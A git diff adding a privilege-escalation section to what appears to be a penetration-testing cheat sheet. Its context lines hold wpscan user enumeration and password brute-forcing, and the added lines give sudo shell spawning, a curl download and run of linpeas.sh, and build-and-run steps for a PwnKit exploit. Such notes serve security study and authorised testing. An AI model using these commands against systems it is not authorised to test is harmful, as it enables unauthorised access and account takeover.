@@ -161,6 +161,27 @@ Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt 
 wpscan --url <URL> -enumerate u
 wpscan --url <URL> -u <Username> -P <path to password list> - Bruteforce password
 wpscan --url <URL> -U <path to user list> -P <path to password list> - Bruteforce password and username
-
+```
 # Priv Esclation
+```
+Simple Horizontal
+
+Nmap -sV -p 22 <IP Address>
+ssh connection ssh@ <Username>@<IP Address>
+Sudo -l – (to view priv as root)
+sudo -u <user> /bin/bash
+Cd /
+Find . -name <filename>
+
+Linpeas git hub – scanner to check for local escalation
+
+# From github
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh 
+./linpeas.sh -a > /dev/shm/linpeas.txt
+
+Pwnkit exploit
+Git clone
+Cd git clone
+Make
+./<complined Code>
 ```
